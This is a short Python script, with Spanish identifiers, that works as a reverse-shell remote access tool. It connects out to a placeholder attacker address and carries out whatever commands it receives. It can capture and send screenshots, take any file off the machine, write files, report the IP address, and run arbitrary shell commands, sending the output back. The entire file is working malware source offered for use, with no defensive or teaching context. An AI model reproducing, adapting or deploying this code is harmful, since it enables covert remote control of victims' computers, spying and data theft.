import socket
import subprocess
import os
import pyautogui
from PIL import ImageGrab

HOST = 'You_Ip'
PORT = 12345

def recibir_comandos(sock):
    while True:
        comando = sock.recv(1024).decode('utf-8')
        if comando.lower() == 'exit':
            break
        elif comando.lower() == 'screenshot':
            screenshot = ImageGrab.grab()
            screenshot.save('screenshot.png')
            with open('screenshot.png', 'rb') as f:
                sock.sendall(f.read())
        elif comando.startswith('cd '):
            path = comando[3:]
            os.chdir(path)
            sock.sendall(os.getcwd().encode('utf-8'))
        elif comando.startswith('download '):
            path = comando[9:]
            with open(path, 'rb') as f:
                sock.sendall(f.read())
        elif comando.lower() == 'getip':
            ip = socket.gethostbyname(socket.gethostname())
            sock.sendall(ip.encode('utf-8'))
        elif comando.startswith('createfile '):
            parts = comando.split(' ', 2)
            if len(parts) == 3:
                path, content = parts[1], parts[2]
                with open(path, 'w') as f:
                    f.write(content)
                sock.sendall(b'File created successfully.')
            else:
                sock.sendall(b'Invalid command format.')
        else:
            resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)
            sock.sendall(resultado.stdout.encode('utf-8') + b'\n' + resultado.stderr.encode('utf-8'))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    recibir_comandos(s)